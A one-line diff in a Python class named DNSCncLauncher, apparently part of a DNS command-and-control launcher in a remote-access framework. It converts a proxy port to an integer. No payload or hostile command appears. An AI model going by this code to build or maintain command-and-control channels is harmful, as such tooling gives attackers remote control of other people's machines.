@@ -288,6 +288,7 @@ class DNSCncLauncher(BaseLauncher):
             stream = None
 
             proxy_addr, proxy_port = proxy.rsplit(':', 1)
+            proxy_port = int(proxy_port)
 
             try:
                 client = t.client(
